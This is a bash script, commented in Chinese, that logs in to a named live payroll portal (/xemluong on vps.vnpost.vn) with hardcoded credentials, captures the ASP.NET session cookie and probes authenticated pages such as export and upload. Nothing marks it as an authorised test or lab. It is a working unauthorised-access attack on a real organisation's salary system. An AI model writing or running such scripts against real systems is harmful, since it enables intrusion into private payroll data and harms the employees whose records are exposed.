#!/bin/bash

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔐 尝试登录 /xemluong 工资系统"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

TARGET="http://vps.vnpost.vn/xemluong/login.aspx"

# 获取ViewState
echo "[1] 获取登录页面ViewState..."
RESPONSE=$(curl -sk "$TARGET" -c cookies_xemluong.txt)

VIEWSTATE=$(echo "$RESPONSE" | grep -oP '__VIEWSTATE" value="\K[^"]+')
VIEWSTATEGENERATOR=$(echo "$RESPONSE" | grep -oP '__VIEWSTATEGENERATOR" value="\K[^"]+')
EVENTVALIDATION=$(echo "$RESPONSE" | grep -oP '__EVENTVALIDATION" value="\K[^"]+')

echo "  ViewState: ${VIEWSTATE:0:50}..."
echo "  Generator: $VIEWSTATEGENERATOR"
echo "  Validation: ${EVENTVALIDATION:0:50}..."

# 尝试登录
echo ""
echo "[2] 尝试登录 (KVMBTCVP:123)..."

LOGIN_RESPONSE=$(curl -sk "$TARGET" \
    -b cookies_xemluong.txt \
    -c cookies_xemluong_after.txt \
    -d "__VIEWSTATE=$VIEWSTATE" \
    -d "__VIEWSTATEGENERATOR=$VIEWSTATEGENERATOR" \
    -d "__EVENTVALIDATION=$EVENTVALIDATION" \
    -d "tUser=KVMBTCVP" \
    -d "tPass=123" \
    -d "tOk=Đăng+nhập" \
    --data-urlencode "tUser=KVMBTCVP" \
    --data-urlencode "tPass=123" \
    -L \
    -w "\nHTTP_CODE:%{http_code}\nFINAL_URL:%{url_effective}\n")

echo "$LOGIN_RESPONSE" > xemluong_login_response.html

# 检查登录结果
echo ""
echo "[3] 分析登录结果..."

if echo "$LOGIN_RESPONSE" | grep -qi "đăng nhập thành công\|xem lương\|main.aspx\|home.aspx\|dashboard"; then
    echo "  ✅ 登录成功！"
    
    # 获取Session
    SESSION=$(grep "ASP.NET_SessionId" cookies_xemluong_after.txt | awk '{print $NF}')
    echo "  Session: $SESSION"
    echo "$SESSION" > xemluong_session.txt
    
    # 检查有哪些功能
    echo ""
    echo "[4] 枚举功能页面..."
    
    PAGES=(
        "/xemluong/main.aspx"
        "/xemluong/home.aspx"
        "/xemluong/index.aspx"
        "/xemluong/report/default.aspx"
        "/xemluong/export.aspx"
        "/xemluong/upload.aspx"
    )
    
    for page in "${PAGES[@]}"; do
        status=$(curl -sk -o /dev/null -w "%{http_code}" \
            "http://vps.vnpost.vn$page" \
            -H "Cookie: ASP.NET_SessionId=$SESSION")
        
        if [ "$status" = "200" ]; then
            echo "  ✅ $page"
        fi
    done
    
elif echo "$LOGIN_RESPONSE" | grep -qi "sai\|incorrect\|failed\|lỗi"; then
    echo "  ❌ 登录失败"
    echo ""
    echo "错误信息:"
    echo "$LOGIN_RESPONSE" | grep -oP '<span[^>]*>[^<]*(?:sai|lỗi|error)[^<]*</span>' | head -5
    
else
    echo "  ⚠️  未知结果"
    
    # 显示HTTP状态码和最终URL
    echo "$LOGIN_RESPONSE" | grep -E "HTTP_CODE|FINAL_URL"
    
    # 显示页面标题
    echo ""
    echo "页面标题:"
    grep -oP '<title>\K[^<]+' xemluong_login_response.html
fi

# 保存cookies
echo ""
echo "[5] 保存的cookies:"
cat cookies_xemluong_after.txt | grep -v "^#"

